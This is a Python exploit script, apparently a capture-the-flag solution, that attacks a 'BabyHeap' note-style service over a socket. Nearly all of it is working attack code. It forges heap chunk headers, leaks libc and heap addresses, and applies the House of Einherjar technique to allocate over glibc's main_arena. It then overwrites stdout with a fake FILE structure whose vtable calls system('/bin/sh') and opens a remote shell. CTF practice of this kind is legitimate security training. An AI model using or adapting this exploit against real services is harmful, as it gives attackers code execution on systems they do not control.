#!/usr/bin/env python
# https://github.com/shift-crops/sc_pwn/blob/master/sc_pwn.py
from sc_pwn import *

env = Environment('local', 'remote')
env.set_item('mode',    local = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  local   = {'host':'192.168.92.129','port':8080}, \
                        remote  = {'host':'202.120.7.218','port':2017})
env.set_item('libc',    local   = 'D:\\CTF\\files\\libc-2.23.so_amd64_local', \
                        remote  = 'libc.so.6_b86ec517ee44b2d6c03096e0518c72a1')
env.set_item('offset_libc_main_arena',  local = 0x3c3b20, remote = 0x3a5620)
env.select()

libc = ELF(env.libc)
str_sh = '/bin/sh'

#==========
def attack(cmn):
    bh = BabyHeap(cmn)
    bh.allocate(0x20)   # index 0
    bh.allocate(0x20)   # index 1
    bh.allocate(0x80)   # index 2
    bh.allocate(0x20)   # index 3
    bh.allocate(0x80)   # index 4
    bh.allocate(0x20)   # index 5


    exploit  = '\x00'*0x28
    exploit += pack_64(0x60 | PREV_INUSE) # index 1's chunk header  : size
    exploit += '\x00'*0x58
    exploit += pack_64(0x60 | PREV_INUSE) # fake chunk in index 2
    bh.fill(0, exploit)
    bh.free(1)

    bh.allocate(0x50)   # index 1
    exploit  = '\x00'*0x28
    exploit += pack_64(0x90 | PREV_INUSE) # correct index 2's chunk header(in index 1's chunk)
    bh.fill(1, exploit)
    bh.free(2)
    bh.free(4)


    # index 1 contain freed index 2's chunk header
    leak_data = bh.dump(1)
    libc.base               = unpack_64(leak_data[0x30:0x38]) - (env.offset_libc_main_arena+0x58)
    info('addr_libc_base    = 0x%08x' % libc.base)
    addr_libc_main_arena    = libc.base + env.offset_libc_main_arena
    addr_libc_system        = libc.function('system')
    addr_libc_stdout        = libc.symbol('_IO_2_1_stdout_')
    addr_libc_stdfile_lock  = addr_libc_stdout + 0x1160         # _IO_stdfile_1_lock
    
    addr_heap_base  = unpack_64(leak_data[0x38:0x40]) - 0x120
    info('addr_heap_base    = 0x%08x' % addr_heap_base)


    bh.allocate(0x80)   # index 2
    bh.allocate(0x80)   # index 4
    exploit  = '\x00'*0x20
    exploit += pack_64((addr_heap_base+0x120)-(addr_libc_main_arena+0x838))     # index 4's chunk header    : prev_size
    exploit += pack_64(0xc0 & ~PREV_INUSE)                                      #                           : size
    bh.fill(3, exploit)
    
    vtables      = '\x00'*0x38
    vtables     += pack_64(addr_libc_system)    # write
    addr_vtables = addr_heap_base + 0x130
    bh.fill(4, vtables)

    # House of Einherjar
    bh.free(4)

    bh.allocate(0x80)   # index 4 (allocate at addr_libc_main_arena+0x838)
    fake_stdout  = str_sh
    fake_stdout += '\x00'*(0x88-len(fake_stdout))
    fake_stdout += pack_64(addr_libc_stdfile_lock)
    fake_stdout += '\x00'*0x48
    fake_stdout += pack_64(addr_vtables)
    bh.fill(4, '\x00'*(addr_libc_stdout-(addr_libc_main_arena+0x838)-0x10)+fake_stdout)

class BabyHeap:
    def __init__(self, cmn):
        self.read_until = cmn.read_until
        self.read_all   = cmn.read_all
        self.sendln     = cmn.sendln
        self.send       = cmn.send

    def allocate(self, size):
        self.read_until('Command: ')
        self.sendln('1')
        self.read_until('Size: ')
        self.sendln(str(size))
        self.read_until('Index ')
        return int(self.read_until())

    def fill(self, index, content):
        self.read_until('Command: ')
        self.sendln('2')
        self.read_until('Index: ')
        self.sendln(str(index))
        self.read_until('Size: ')
        self.sendln(str(len(content)))
        self.read_until('Content: ')
        self.send(content)

    def free(self, index):
        self.read_until('Command: ')
        self.sendln('3')
        self.read_until('Index: ')
        self.sendln(str(index))

    def dump(self, index):
        self.read_until('Command: ')
        self.sendln('4')
        self.read_until('Index: ')
        self.sendln(str(index))
        self.read_until('Content: \n')
        return self.read_until('1. Allocate', contain=False)
        
#==========

if __name__=='__main__':
    cmn = Communicate(env.target, env.mode)
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    #Interact(cmn).worker(False)
    
    del(cmn)
    
#==========
